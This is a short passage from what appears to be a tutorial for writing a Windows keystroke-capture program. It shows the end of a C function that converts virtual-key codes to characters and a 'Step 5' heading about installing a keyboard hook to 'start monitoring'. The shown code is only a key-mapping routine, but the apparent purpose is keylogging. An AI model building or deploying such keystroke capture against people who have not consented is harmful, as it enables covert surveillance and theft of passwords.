        c = '\'';
    } else if (vk >= 0x79 && vk <= 0x7E) {
        c = ' ';
    } else {
        c = '?';
    }
    return c;
}
```

**Step 5: Set Up the Keyboard Hook**

Initialize the hook and start monitoring.

